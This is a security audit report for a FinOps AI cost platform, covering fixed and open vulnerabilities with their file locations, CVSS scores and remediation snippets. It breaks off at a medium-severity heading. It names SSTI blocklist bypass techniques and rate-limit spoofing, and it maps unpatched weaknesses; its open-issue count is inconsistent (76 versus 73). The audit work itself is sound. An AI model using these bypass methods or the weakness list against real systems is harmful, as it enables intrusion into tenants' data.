# Security Audit Report

## FinOps AI Cost Intelligence Platform

| | |
|---|---|
| **Report Date** | 2026-03-06 |
| **Previous Audits** | 2026-03-05, 2026-03-04, 2026-02-08, 2026-01-31 |
| **Methodology** | Penetration test, static code analysis, dependency scanning, infrastructure review |
| **Scope** | Backend (Python/FastAPI), Frontend (React/TypeScript), Infrastructure (CloudFormation, Docker, Nginx), Database Models & Migrations, Dependencies |

---

## Table of Contents

| # | Section | Description |
|---|---------|-------------|
| 1 | [Executive Summary](#1--executive-summary) | Risk overview, progress, and systemic findings |
| 2 | [Open Vulnerability Matrix](#2--open-vulnerability-matrix) | All open issues in one sortable table |
| 3 | [Critical Vulnerabilities](#3--critical-vulnerabilities-0-open) | Detailed analysis & remediation for CRITICAL findings |
| 4 | [High Vulnerabilities](#4--high-vulnerabilities-27-open) | Detailed analysis & remediation for HIGH findings |
| 5 | [Medium Vulnerabilities](#5--medium-vulnerabilities-32-open) | Detailed analysis & remediation for MEDIUM findings |
| 6 | [Low Vulnerabilities](#6--low-vulnerabilities-14-open) | Concise table of LOW findings with fixes |
| 7 | [SaaS Multi-Tenant Checklist](#7--saas-multi-tenant-security-checklist) | Per-client configurability requirements |
| 8 | [Remediation Roadmap](#8--prioritized-remediation-roadmap) | Phased action plan |
| A | [Appendix: Fixed Issues](#appendix-a--fixed-issues) | Pointer to historical fix record |

---

## 1 — Executive Summary

This is the fifth comprehensive security audit. Deep-dive review of the F-33 `api/chat.py` rewrite and a PII-logging sweep uncovered **6 new vulnerabilities**. The most significant was **HIGH-34: a PII-leakage regression introduced by the F-33 security fix itself** — the rewritten chat error handler dumped the entire user request body (message text, chat history, context) into structured logs on any exception. **Both CRIT-12 and HIGH-34 were fixed during this cycle** — the regression was closed on the same day it was discovered, with canary-based behavioural tests and AST source tripwires preventing reintroduction.

**CRIT-12 (SQL Injection via Date Parameters in Athena Queries) was fixed this cycle** — the last remaining CRITICAL finding. The fix extended beyond the original `athena_query_service.py` target: two sibling injection paths were discovered and remediated in `multi_account_service.py` (direct HTTP attack path via `GET /accounts/aggregate-costs` with unvalidated `str` query params) and `athena_cur_templates.py` (~20 query methods, closed via a choke-point validator in `_build_partition_filter` plus a per-param fix for the `s3_spike_analysis` 4-date-param edge case). 242 regression tests added. See [F-36](./FIXED_SECURITY_ISSUES.md).

### Risk Dashboard

```
 CRITICAL     0 open     (was 1, -1 fixed)     ← ALL CRITICALS CLEARED
 HIGH      ███████████████████████████  27 open    (was 32, +1 new -6 fixed)
 MEDIUM    ████████████████████████████████  32 open    (was 28, +4 new)
 LOW       ██████████████  14 open    (was 13, +1 new)
 ──────────────────────────────────────────
 TOTAL OPEN: 73          FIXED: 42 (historical)
```

| Severity | Previously Open | Fixed This Cycle | New Findings | **Total Open** |
|:---------|:---------------:|:----------------:|:------------:|:--------------:|
| CRITICAL | 1 | **1** | 0 | **0** |
| HIGH | 32 | **6** | +1 | **27** |
| MEDIUM | 28 | 0 | +4 | **32** |
| LOW | 13 | 0 | +1 | **14** |
| **Total** | **74** | **7** | **+6** | **73** |

### Top 3 Systemic Risks

> **1. Security Fixes Introducing Security Bugs**
> The F-33 rewrite of `api/chat.py` (which fixed CRIT-10) added an error handler that logged `request_payload=request.dict()` — leaking the full user message, chat history, and context into CloudWatch on **any** exception (HIGH-34 — **now fixed**, F-37). The F-21 PII-masking fix covered 6 log statements in `auth.py` but missed the logout handler (MED-30). HIGH-32 (per-user rate limiter) is **now fixed** — F-38 caches limiters module-level and adds an AST tripwire blocking any future `RateLimiter(...)` construction inside per-request functions. HIGH-33 (`FIELD_ENCRYPTION_KEY` never provisioned → container crash-loop) is **now fixed** — F-39 provisions the secret across both deployment artifacts (CloudFormation + direct task-def) with a CI tripwire that cross-checks every production hard-crash env var against both files. **Every security change must be reviewed for its own attack surface** — F-37's canary-based behavioural tests and AST source tripwires are the template for guarding against this class of regression.

> **2. Inconsistent Authentication Enforcement**
> The opportunities API still has **zero** `Depends(get_request_context)` decorators — `api/opportunities.py` operates entirely on optional context that returns `None` when unauthenticated. *(All chat and reports endpoints are now hardened — F-33/F-35.)*

> **3. PII Leakage in Logs is Endemic**
> Beyond the 3 locations documented in MED-28, this audit confirms unmasked email/payload logging in **8 additional call sites** across chat, auth, auth-middleware, athena-queries, saved-views, organizations, account-scoping middleware, and the email service stub. A grep-based CI tripwire is needed.

### Audit Cycle Delta (2026-03-05 → 2026-03-06)

| Category | IDs | Notes |
|:---------|:----|:------|
| **Fixed** | **CRIT-12**, **HIGH-34**, **HIGH-32**, **HIGH-33**, **HIGH-1**, **HIGH-8**, **HIGH-3** | CRIT-12: service-layer date/limit validation across 3 files, 2 sibling injection paths closed, 242 tests → [F-36](./FIXED_SECURITY_ISSUES.md). HIGH-34: `request.dict()` log-dump removed, shape-only logging (lengths/bools/error_type), 9 tests → [F-37](./FIXED_SECURITY_ISSUES.md). HIGH-32: per-user limiter cached module-level (was reconstructed per-request → `_storage` always empty → limit never fired), 11 tests → [F-38](./FIXED_SECURITY_ISSUES.md). HIGH-33: `FIELD_ENCRYPTION_KEY` provisioned — secret resource + IAM grant in `main-stack.yaml`, Secrets entries in both `ecs-services.yaml` and `task-def.json` (sibling deployment path discovered during scan), 15 tests → [F-39](./FIXED_SECURITY_ISSUES.md). HIGH-1: Valkey-backed login brute-force protection — per-IP (20/15m) + per-email (5/15m) + progressive-backoff lockout (15m→24h), fail-open on cache outage, 36 tests → [F-40](./FIXED_SECURITY_ISSUES.md). HIGH-8: middleware `except Exception` now fails closed (raises `TokenInvalidError`) instead of swallowing cache errors and letting revoked tokens through, 5 tests → [F-41](./FIXED_SECURITY_ISSUES.md). HIGH-3: verified **not applicable** — auth is pure Bearer-header (no cookies, no `set_cookie` anywhere in backend), CSRF requires browser-automatic credential attachment which `Authorization` headers don't do → [F-42](./FIXED_SECURITY_ISSUES.md) |
| **New — HIGH** | HIGH-34 *(fixed same cycle)* | **Regression** — introduced by F-33 at `api/chat.py:249`, fixed before cycle close |
| **New — MEDIUM** | MED-30, MED-31, MED-32, MED-33 | PII in logout/revoked-token/athena logs; backend CSV formula injection |
| **New — LOW** | LOW-14 | Email recipient list logged unmasked in email service stub |
| **Scope Extended** | MED-16 / MED-28 | +4 unmasked-email locations confirmed: `saved_views.py:233`, `organizations.py:200`, `account_scoping.py:103,231` |

### Partial Improvements Noted

| ID | Issue | Status | Evidence |
|:---|:------|:-------|:---------|
| MED-3 | LLM raw response logged | **PARTIAL** | `text_to_sql_service.py:661` truncates to 200-char preview |
| MED-15 | Account enumeration via login errors | **PARTIAL** | 3 of 4 failure paths unified; `auth.py:208` still differs |

---

## 2 — Open Vulnerability Matrix

All **76 open issues** sorted by severity and CVSS score. Use this table as a tracking dashboard.

### Critical (0)

*All CRITICAL findings have been remediated. CRIT-12 fixed 2026-03-06 — see [F-36](./FIXED_SECURITY_ISSUES.md).*

### High (27)

| ID | Title | CVSS | Location | Discovered |
|:---|:------|:----:|:---------|:-----------|
| HIGH-4 | Race Condition in Opportunity Cost Calculations | 7.8 | `services/opportunities_service.py:150-200` | 2026-02-08 |
| HIGH-5 | TOCTOU in Saved Views Access Control | 7.5 | `services/saved_views_service.py:142-170` | 2026-02-08 |
| HIGH-6 | Mass Assignment in Opportunity Updates | 7.5 | `api/opportunities.py:300-330` | 2026-02-08 |
| HIGH-7 | In-Memory Rate Limiting Ineffective | 7.5 | `middleware/rate_limiting.py:23-51` | 2026-02-08 |
| HIGH-9 | Dynamic SQL Column Names in opportunities_service | 7.8 | `services/opportunities_service.py:446-462` | 2026-02-08 |
| HIGH-10 | Race Condition in Saved Views Default Flag | 7.5 | `services/saved_views_service.py:76-84` | 2026-02-08 |
| HIGH-11 | TOCTOU in Organization Member Limit | 6.8 | `services/organization_service.py:336-352` | 2026-02-08 |
| HIGH-12 | X-Forwarded-For Spoofing Bypasses Rate Limits | 7.5 | `middleware/rate_limiting.py:60-63` | 2026-03-04 |
| HIGH-13 | Long Password Denial of Service | 7.5 | `api/auth.py:42` | 2026-03-04 |
| HIGH-14 | Missing Tenant Isolation in Conversation Access | 8.0 | `services/conversation_manager.py:139-424` | 2026-03-04 |
| HIGH-15 | Missing Tenant Isolation on Analytics Endpoints | 8.0 | `api/analytics.py:63-318` | 2026-03-04 |
| HIGH-16 | IDOR on Organization Details | 7.5 | `api/organizations.py:147-165` | 2026-03-04 |
| HIGH-17 | Missing Membership Verify on Org Switch | 8.5 | `api/organizations.py:111-144` | 2026-03-04 |
| HIGH-18 | Arbitrary Permission Strings in Role Creation | 7.8 | `api/phase3_enterprise.py:93-96` | 2026-03-04 |
| HIGH-19 | Path/Body Param Mismatch in Account Perms | 7.5 | `api/phase3_enterprise.py:241-258` | 2026-03-04 |
| HIGH-20 | Missing Auth on Opportunities Endpoints | 8.5 | `api/opportunities.py:67-71` | 2026-03-04 |
| HIGH-21 | Backend Docker Container Runs as Root | 7.0 | `backend/Dockerfile` | 2026-03-04 |
| HIGH-22 | Frontend Docker Container Runs as Root | 7.0 | `frontend/Dockerfile` | 2026-03-04 |
| HIGH-23 | No Security Headers in Nginx | 7.5 | `frontend/nginx.conf` | 2026-03-04 |
| HIGH-24 | Valkey Transit Encryption Disabled | 7.5 | `cloudformation/main-stack.yaml:412` | 2026-03-04 |
| HIGH-25 | Overly Broad IAM Policies (Wildcard Resources) | 7.5 | `cloudformation/main-stack.yaml:520-588` | 2026-03-04 |
| HIGH-26 | Database/Cache Ports Exposed to Host | 7.0 | `docker-compose.yml:12-13,28-29` | 2026-03-04 |
| HIGH-27 | Supply Chain Risk: Non-Registry Dependency | 7.0 | `frontend/package.json:36` | 2026-03-04 |
| HIGH-28 | Missing org_id on Multiple DB Tables | 8.0 | Multiple migration files | 2026-03-04 |
| HIGH-29 | Prompt Injection in Text-to-SQL Service | 7.8 | `services/text_to_sql_service.py:632-659` | 2026-03-04 |
| HIGH-30 | SSTI Blocklist Bypass in Report Templates | 7.5 | `api/phase3_enterprise.py:42-68` | 2026-03-04 |
| HIGH-31 | Password Hash Column Indexed | 7.0 | `alembic/versions/013_*.py:39` | 2026-03-04 |

### Medium (32)

| ID | Title | CVSS | Location | Discovered |
|:---|:------|:----:|:---------|:-----------|
| MED-1 | Account Scoping Fails Open | 6.5 | `middleware/account_scoping.py:111-122` | 2026-01-31 |
| MED-2 | Unauthenticated Prometheus Metrics | 6.5 | `main.py:278-281` | 2026-01-31 |
| MED-3 | LLM Response Preview Still Logged | 5.0 | `services/text_to_sql_service.py:661` | 2026-01-31 |
| MED-4 | Weak Password Policy | 6.5 | `api/auth.py:42` | 2026-01-31 |
| MED-6 | Missing Rate Limit on Token Validation | 5.3 | `api/auth.py` | 2026-01-31 |
| MED-7 | Default SSL Mode Unverified | 5.9 | `services/database.py:67-77` | 2026-01-31 |
| MED-8 | Production Sourcemaps Exposed | 5.3 | `frontend/vite.config.ts:24` | 2026-01-31 |
| MED-9 | Unvalidated Cron Expression | 5.3 | `services/scheduled_report_service.py:380` | 2026-01-31 |
| MED-10 | Internal Error Details in Chat Response | 6.2 | `agents/multi_agent_workflow.py` | 2026-01-31 |
| MED-11 | Stack Traces in Development Mode | 6.5 | `main.py:240-252` | 2026-02-08 |
| MED-12 | Race Condition in Org Member Management | 6.8 | `services/organization_service.py:286-367` | 2026-02-08 |
| MED-13 | TOCTOU in Org Member Removal | 6.5 | `services/organization_service.py:369-436` | 2026-02-08 |
| MED-14 | No Validation in Cost Aggregation | 6.2 | `services/multi_account_service.py:166-205` | 2026-02-08 |
| MED-15 | Account Enumeration via "Account is disabled" | 5.3 | `api/auth.py:204-209` | 2026-03-04 |
| MED-16 | Inconsistent PII Masking Across Codebase | 5.3 | Multiple files (see MED-28 for full inventory) | 2026-03-04 |
| MED-17 | Salt Reused During Password Hash Migration | 5.5 | `api/auth.py:246-250` | 2026-03-04 |
| MED-18 | JWT is_admin Not Re-Verified Per Request | 6.0 | `middleware/authentication.py:224-230` | 2026-03-04 |
| MED-19 | Unbounded Memory Growth in Rate Limiter | 5.5 | `middleware/rate_limiting.py:49-50` | 2026-03-04 |
| MED-20 | CSV Injection in Frontend Export | 5.5 | `frontend/src/utils/exportUtils.ts:90-99` | 2026-03-04 |
| MED-21 | CORS Includes localhost in Production | 5.0 | `cloudformation/ecs-services.yaml:158-162` | 2026-03-04 |
| MED-22 | 7-Day Log Retention Insufficient | 5.0 | `cloudformation/ecs-services.yaml:90,96` | 2026-03-04 |
| MED-23 | WAF Removed from Infrastructure | 6.0 | `cloudformation/main-stack.yaml:495` | 2026-03-04 |
| MED-24 | Unbounded RBAC Permission Cache | 5.5 | `services/rbac_service.py:25-78` | 2026-03-04 |
| MED-25 | Auto-Create User on First Login | 6.0 | `services/rbac_service.py:260-285` | 2026-03-04 |
| MED-26 | Singleton Service with Mutable Org ID | 6.5 | `services/opportunities_service.py:999-1012` | 2026-03-04 |
| MED-27 | Database Connection Leak on Exception | 5.5 | `services/opportunities_service.py:261-474` | 2026-03-04 |
| MED-28 | Unmasked Emails in New Rate-Limit Code Paths | 5.3 | `rate_limiting.py:461,485`; `admin/rate_limits.py:397` | 2026-03-05 |
| MED-29 | Unvalidated Role String in Rate-Limit Admin API | 5.0 | `api/admin/rate_limits.py:33` | 2026-03-05 |
| **MED-30** | **Unmasked Email in Logout Handler (F-21 Gap)** | **5.3** | **`api/auth.py:517`** | **2026-03-06** |
| **MED-31** | **Unmasked Email in Revoked-Token Warning** | **5.3** | **`middleware/authentication.py:215`** | **2026-03-06** |
| **MED-32** | **CSV Formula Injection in Backend Opportunities Export** | **5.5** | **`api/opportunities.py:589-604`** | **2026-03-06** |
| **MED-33** | **Unmasked Natural-Language Query in Athena Log** | **5.3** | **`api/athena_queries.py:65`** | **2026-03-06** |

### Low (14)

| ID | Title | CVSS | Location | Discovered |
|:---|:------|:----:|:---------|:-----------|
| LOW-1 | Weak Default Passwords in docker-compose | 4.3 | `docker-compose.yml:10,30,55,58` | 2026-01-31 |
| LOW-2 | Unbounded Audit Query Parameters | 4.3 | `api/phase3_enterprise.py:390-423` | 2026-01-31 |
| LOW-3 | Short Hash in PII Masking (32 bits) | 4.3 | `utils/pii_masking.py:74-76` | 2026-02-08 |
| LOW-4 | Organization Slug Collision Risk | 3.1 | `services/organization_service.py:68-80` | 2026-02-08 |
| LOW-5 | Default DB Credentials in Settings | 4.0 | `config/settings.py:136-139` | 2026-03-04 |
| LOW-6 | HSTS Disabled by Default | 4.0 | `config/settings.py:68-72` | 2026-03-04 |
| LOW-7 | Missing JWT Audience Claim | 3.5 | `utils/auth.py:158-173` | 2026-03-04 |
| LOW-8 | No Refresh Token Rotation | 4.3 | `api/auth.py:327-412` | 2026-03-04 |
| LOW-9 | Insecure Default Secret Accepted | 4.0 | `utils/auth.py:121-132` | 2026-03-04 |
| LOW-10 | Permission Names in Error Messages | 3.1 | `services/rbac_service.py:208-252` | 2026-03-04 |
| LOW-11 | Redundant is_admin Flag vs RBAC | 3.5 | `alembic/versions/008_*.py:39` | 2026-03-04 |
| LOW-12 | Nginx Server Version Disclosure | 3.0 | `frontend/nginx.conf` | 2026-03-04 |
| LOW-13 | Empty SECRET_KEY Default in Docker Compose | 4.3 | `docker-compose.yml:59` | 2026-03-04 |
| **LOW-14** | **Unmasked Recipient List in Email Service Stub** | **3.5** | **`services/email_service.py:40`** | **2026-03-06** |

---

## 3 — Critical Vulnerabilities (0 Open)

**All CRITICAL findings have been remediated.**

> **CRIT-12** (SQL Injection via Date Parameters in Athena Queries, CVSS 8.6) — **FIXED 2026-03-06.**
> Primary fix in `athena_query_service.py` (6 methods) plus two sibling injection paths discovered and closed during deep research: `multi_account_service.py:_build_aggregation_query` (direct HTTP attack path — `api/phase3_enterprise.py:280` passed raw `str` query params with zero upstream validation) and `athena_cur_templates.py` (~20 methods via `_build_partition_filter` choke-point, plus per-param validation in `s3_spike_analysis` where only `min()`/`max()` of 4 date params reached the choke-point). Defense-in-depth: API-layer `date.fromisoformat()` at `api/athena_queries.py:73-75` retained. 242 regression tests in `tests/unit/services/test_athena_sql_injection_crit12.py`. Full details: [**F-36** in FIXED_SECURITY_ISSUES.md](./FIXED_SECURITY_ISSUES.md).

---

## 4 — High Vulnerabilities (27 Open)

> **HIGH-34** (Full Request Body Logged on Chat Error, F-33 Regression, CVSS 7.5) — **DISCOVERED & FIXED 2026-03-06.** `request.dict()` log-dump removed; handler now logs shape-only metadata (`message_length`, `has_history`, `has_context`, `error_type=type(e).__name__`). `error=str(e)` also removed — upstream exceptions (LLM client, agent workflow, asyncpg) may embed request fragments. `traceback.format_exc()` removed (redundant with `exc_info=True`, was leaking exception message twice). Codebase-wide scan confirmed this was the only `request.dict()` log-dump. 9 regression tests in `tests/unit/api/test_chat_security.py`: canary-based behavioural tests inject PII into all `ChatRequest` fields and recursively scan captured log kwargs; AST source tripwire catches `request.dict()`/`model_dump()` calls while ignoring comments. See [**F-37** in FIXED_SECURITY_ISSUES.md](./FIXED_SECURITY_ISSUES.md).

### PREVIOUSLY-IDENTIFIED HIGH FINDINGS (re-verified open)

> #### ~~HIGH-32 — Per-User Rate Limiter Ineffective (Fresh Instance Per Request)~~ — **FIXED 2026-03-06 → [F-38](./FIXED_SECURITY_ISSUES.md)**
> `check_athena_export_rate_limit()` constructed a fresh `RateLimiter` per request → instance-scoped `_storage` was always empty → per-user limit never fired. Fixed by caching limiters module-level keyed by limit value. 11 regression tests including an AST tripwire blocking any `RateLimiter(...)` construction outside a cached `get_*`/`_get_*` getter.

> #### ~~HIGH-33 — FIELD_ENCRYPTION_KEY Missing from Infrastructure Configuration~~ — **FIXED 2026-03-06 → [F-39](./FIXED_SECURITY_ISSUES.md)**
> `encryption.py:97` raises `ValueError` on boot when `ENVIRONMENT=production` and `FIELD_ENCRYPTION_KEY` is unset/short — both ECS deployment artifacts set `ENVIRONMENT=production` but neither provisioned the key, so the container crash-looped. Fixed across all three moving parts: `FieldEncryptionKeySecret` (64-char `GenerateSecretString`) + execution-role IAM grant in `main-stack.yaml`; `Secrets` entry in `ecs-services.yaml`; `secrets` entry in `task-def.json` (sibling deployment path, same bug, discovered during scan). 15 regression tests including a CI tripwire that enumerates every production hard-crash env var and asserts all are present in both deployment artifacts.

---

### Authentication & Access Control

> #### ~~HIGH-1 — No Brute Force Protection on Login~~ — **FIXED 2026-03-06 → [F-40](./FIXED_SECURITY_ISSUES.md)**
> Valkey-backed per-IP (20/15m, catches spray) + per-email (5/15m, catches targeted) + progressive-backoff lockout (strike-based: 15m → 30m → 1h → ... → 24h cap). Checks BEFORE DB access (no timing oracle, 429 identical for real/nonexistent emails — MED-15 tie-in). Records on all 4 failure paths including user-not-found. Email case-normalized before hashing. Clears email state on success, NOT the IP counter (shared NAT). **Fails open on cache outage** — opposite of token-blacklist's fail-closed; deliberate asymmetry (cache down → degraded protection, not total lockout; PBKDF2 600k still slows brute force). 36 tests including AST tripwires pinning check-before-DB ordering and all 4 record sites.

> #### ~~HIGH-3 — Missing CSRF Protection~~ — **NOT APPLICABLE — VERIFIED 2026-03-06 → [F-42](./FIXED_SECURITY_ISSUES.md)**
> Finding was factually correct (no CSRF middleware exists, `allow_credentials=True`) but the risk assessment assumed cookie-based auth. Verified: **zero `set_cookie` calls in `backend/`** — auth is pure `Authorization: Bearer <jwt>` header (`authentication.py:199-200`). CSRF attacks work because browsers **automatically attach cookies** to cross-origin requests; the `Authorization` header is never sent automatically — JavaScript must set it explicitly, and `evil.com` can't read the JWT from the victim's localStorage (same-origin policy). `allow_credentials=True` is **required** for the `Authorization` header to traverse CORS (without it browsers drop the header on cross-origin requests) — it's correct config, not a misconfiguration. Origin-allowlist validation exists at `settings.py:710` (blocks `*` + credentials). **No code change; closed by verification.** If cookie auth is ever introduced, re-open.

> #### ~~HIGH-8 — Fail-Open Cache Bypass in Auth Middleware~~ — **FIXED 2026-03-06 → [F-41](./FIXED_SECURITY_ISSUES.md)**
> The `except Exception` at `authentication.py:220` swallowed cache-infrastructure errors and let the request through — defeating F-25's fail-closed design one layer up. Now raises `TokenInvalidError("Unable to verify token status")` → 401. Logged at ERROR (was DEBUG) so cache outages surfacing as auth denials trigger ops alerts. User-facing message is generic "Invalid authentication token" (doesn't leak that cache is down). **Completes the HIGH-1 fail-open/fail-closed asymmetry** documented in `login_throttle.py`: rate limits fail open (degraded protection, PBKDF2 still slows attack), revocation checks fail closed (degraded == bypassed). An existing test (`test_blacklist_check_failure_allows_token`) was **pinning the wrong behavior** — inverted. 5 regression tests: 3 behavioral (get_cache_service raises → 401; ERROR logged not DEBUG; is_blacklisted raises → 401), 2 source tripwires (string `"blacklist_check_skipped"` banned; AST asserts `except Exception` handler contains a `Raise` node).

#### HIGH-13 — Long Password Denial of Service
**File:** `backend/api/auth.py:42` | **CVSS:** 7.5

```python
password: str = Field(..., min_length=1)  # no max_length
```
10MB password × 600k PBKDF2 iterations = CPU exhaustion.

**Remediation:** `password: str = Field(..., min_length=8, max_length=128)`

#### HIGH-17 — Missing Membership Verification on Organization Switch
**File:** `backend/api/organizations.py:111-144` | **CVSS:** 8.5

`switch_organization()` is called without first verifying the caller is a member of the target org.

**Remediation:** Check membership before delegating to the service.

#### HIGH-20 — Missing Authentication on Opportunities Endpoints
**File:** `backend/api/opportunities.py:67-71` | **CVSS:** 8.5

Zero `Depends(get_request_context)` / `Depends(require_auth)` in the file. `get_context_from_request()` returns `None` when unauthenticated → service operates without tenant scoping.

**Remediation:** Add `context: RequestContext = Depends(get_request_context)` to every route. Remove the `None`-tolerant fallback in `get_service()`.

---

### Tenant Isolation

#### HIGH-14 — Missing Tenant Isolation in Conversation Access (Service Layer)
**File:** `backend/services/conversation_manager.py:139-424` | **CVSS:** 8.0

`get_conversation_history()` accepts `thread_id` without owner verification at the service layer.

> F-33 enforces ownership at the **API** layer via `require_conversation_owner()`. This finding stays open because any new caller (scheduled job, admin tool, future endpoint) that bypasses `api/chat.py` gets no protection.

**Remediation:** Add `user_id` param and `WHERE user_id = $N` to all service queries.

#### HIGH-15 — Missing Tenant Isolation on Analytics Endpoints
**File:** `backend/api/analytics.py:63-318` | **CVSS:** 8.0

Cost Explorer calls at line 77 are not filtered by the requester's account list.

**Remediation:** Pass `context.account_ids` to the Cost Explorer `Filter` param.

#### HIGH-16 — IDOR on Organization Details
**File:** `backend/api/organizations.py:147-165` | **CVSS:** 7.5

`GET /organizations/{org_id}` has no membership check.

**Remediation:** Verify membership before returning org details.

#### HIGH-28 — Missing org_id Tenant Isolation on Multiple DB Tables
**Files:** `alembic/versions/006_*.py`, `009_*.py` | **CVSS:** 8.0

Missing `organization_id` on: `scheduled_reports`, `report_executions`, `dashboard_templates`, `cost_allocation_rules`, `chargeback_reports`, `ticketing_integrations`, `tickets`.

**Remediation:** New migration adding `organization_id NOT NULL` FK to each.

---

### Injection & Input Validation

#### HIGH-9 — Dynamic SQL Column Names in opportunities_service
**File:** `backend/services/opportunities_service.py:446-462` | **CVSS:** 7.8

```python
columns = list(data.keys())
query = f"INSERT INTO opportunities ({', '.join(columns)}) VALUES ..."
```

**Remediation:** `ALLOWED_COLUMNS` frozenset; reject unknown keys before query build.

#### HIGH-12 — X-Forwarded-For Spoofing Bypasses Rate Limits
**File:** `backend/middleware/rate_limiting.py:60-63` | **CVSS:** 7.5

`forwarded.split(",")[0].strip()` trusts the client-supplied leftmost entry.

**Remediation:** Trust only the Nth-from-last entry where N = known proxy depth.

#### HIGH-18 — Arbitrary Permission Strings in Role Creation
**File:** `backend/api/phase3_enterprise.py:93-96` | **CVSS:** 7.8

`permissions: List[str]` with no allowlist.

**Remediation:** Validate each entry against the RBAC config's known permission set.

#### HIGH-19 — Path/Body Parameter Mismatch in Account Permissions
**File:** `backend/api/phase3_enterprise.py:241-258` | **CVSS:** 7.5

Line 253 uses `permission.account_id` (body) instead of the path `account_id`.

**Remediation:** Assert `permission.account_id == account_id` or drop the body field and use path only.

#### HIGH-29 — Prompt Injection in Text-to-SQL Service
**File:** `backend/services/text_to_sql_service.py:632-659` | **CVSS:** 7.8

`UNION SELECT` and SQL comments only warn, never block. Account-filter injection bypassed if keyword already present.

**Remediation:** Block (don't warn) on dangerous patterns. Verify account filter references only allowed accounts.

#### HIGH-30 — SSTI Blocklist Bypass in Report Templates
**File:** `backend/api/phase3_enterprise.py:42-68` | **CVSS:** 7.5

Blocklist bypassable via Unicode homoglyphs, `|attr` filter chains, or unlisted objects (`request`, `session`, `cycler`, `joiner`, `namespace`).

**Remediation:** `SandboxedEnvironment` + allowlist of safe variables/filters.

---

### Race Conditions

#### HIGH-4 — Race Condition in Opportunity Cost Calculations
**File:** `backend/services/opportunities_service.py:150-200` | **CVSS:** 7.8

Non-atomic read-modify-write. **Fix:** `SELECT ... FOR UPDATE` inside a transaction.

#### HIGH-5 — TOCTOU in Saved Views Access Control
**File:** `backend/services/saved_views_service.py:142-170` | **CVSS:** 7.5

SELECT + ownership check + UPDATE in separate statements. **Fix:** `SELECT ... FOR UPDATE`.

#### HIGH-6 — Mass Assignment in Opportunity Updates
**File:** `backend/api/opportunities.py:300-330` | **CVSS:** 7.5

`body.model_dump(exclude_none=True)` passes every non-None field. **Fix:** explicit allowlist of updatable fields.

#### HIGH-7 — In-Memory Rate Limiting Ineffective Across Instances
**File:** `backend/middleware/rate_limiting.py:23-51` | **CVSS:** 7.5

Per-worker in-memory counters. **Fix:** Valkey `INCR` + `EXPIRE`.

#### HIGH-10 — Race Condition in Saved Views Default Flag
**File:** `backend/services/saved_views_service.py:76-84` | **CVSS:** 7.5

Concurrent requests → multiple defaults. **Fix:** unique partial index or `FOR UPDATE`.

#### HIGH-11 — TOCTOU in Organization Member Limit
**File:** `backend/services/organization_service.py:336-352` | **CVSS:** 6.8

Count check + insert not atomic. **Fix:** `INSERT ... WHERE (SELECT COUNT(*) ...) < limit`.

---

### Infrastructure

#### HIGH-21 & HIGH-22 — Docker Containers Run as Root
**Files:** `backend/Dockerfile`, `frontend/Dockerfile` | **CVSS:** 7.0

Backend uses `/root/.local`. Neither has a `USER` directive.

```dockerfile
# Backend
RUN adduser --disabled-password --gecos '' appuser
USER appuser
# Frontend
RUN adduser -D -g '' appuser && chown -R appuser:appuser /usr/share/nginx/html
USER appuser
```

#### HIGH-23 — No Security Headers in Nginx Configuration
**File:** `frontend/nginx.conf` | **CVSS:** 7.5

Missing CSP, X-Frame-Options, HSTS, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, `server_tokens off`.

```nginx
server_tokens off;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self';" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

#### HIGH-24 — Valkey Transit Encryption Disabled in Production
**File:** `infrastructure/cloudformation/main-stack.yaml:412` | **CVSS:** 7.5

`TransitEncryptionEnabled: false` — cache traffic (tokens included) plaintext within VPC.

**Fix:** Set `true`; update Valkey client to use TLS.

#### HIGH-25 — Overly Broad IAM Policies with Wildcard Resources
**File:** `infrastructure/cloudformation/main-stack.yaml:520-588` | **CVSS:** 7.5

`Resource: '*'` for CloudWatch Logs (520), Glue (570), Athena (579), Cost Explorer (588).

> **Compound risk:** `logs:*` on `Resource: '*'` combined with MED-28/MED-33 (unmasked PII in logs) means anyone who can assume the task role can read cross-tenant log content. *(The full-chat-payload variant of this — HIGH-34 — was fixed in F-37.)*

**Fix:** Scope each to specific ARNs.

#### HIGH-26 — Database/Cache Ports Exposed to Host
**File:** `docker-compose.yml:12-13,28-29` | **CVSS:** 7.0

`5432:5432` and `6379:6379` bound to host. **Fix:** remove `ports`; use Docker network only.

#### HIGH-27 — Supply Chain Risk: Non-Registry Dependency
**File:** `frontend/package.json:36` | **CVSS:** 7.0

```json
"xlsx": "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz"
```
Bypasses npm integrity. **Fix:** pin integrity hash in lockfile or vendor.

#### HIGH-31 — Password Hash Column Indexed
**File:** `alembic/versions/013_add_password_fields_secure_hashing.py:39` | **CVSS:** 7.0

```python
op.create_index('idx_users_password_hash', 'users', ['password_hash'])
```
No legitimate lookup path. **Fix:** `op.drop_index` in a new migration.

---

## 5 — Medium Vulnerabilities (32 Open)

### NEW FINDINGS (2026-03-06)

#### MED-30 — Unmasked Email in Logout Handler (F-21 Gap)
**File:** `backend/api/auth.py:517` | **CVSS:** 5.3 | **Discovered:** 2026-03-06

F-21 applied `mask_email()` to **6** log statements in `api/auth.py` but missed the logout path:
```python
logger.info(
    "user_logout",
    user_id=user.user_id,
    email=user.email,   # ← not masked
    ...
)
```

Every logout writes a plaintext email to CloudWatch. Same GDPR surface as MED-28.

**Claude Code Fix Instructions:**
```
In backend/api/auth.py, find logger.info("user_logout", ...) near line 517.
Change email=user.email to email=mask_email(user.email). mask_email is
already imported in this file from F-21. Add one assertion to the existing
test_auth_pii_masking test suite covering the logout path.
```

#### MED-31 — Unmasked Email in Revoked-Token Warning
**File:** `backend/middleware/authentication.py:215` | **CVSS:** 5.3 | **Discovered:** 2026-03-06

Inside the blacklist-hit branch (a token replay attempt — a **security-relevant event**):
```python
logger.warning(
    "revoked_token_used",
    user_id=payload.user_id,
    email=payload.email,   # ← not masked
)
```

Token replay attempts are high-value audit signals that will be forwarded to SIEM. Forwarding plaintext email to a third-party SIEM is a data-processor contract risk.

**Claude Code Fix Instructions:**
```
In backend/middleware/authentication.py near line 215, import mask_email
from utils.pii_masking and change email=payload.email to
email=mask_email(payload.email). Note: this file has THREE email=
occurrences — check lines ~215, ~230, and any others; mask all of them.
```

#### MED-32 — CSV Formula Injection in Backend Opportunities Export
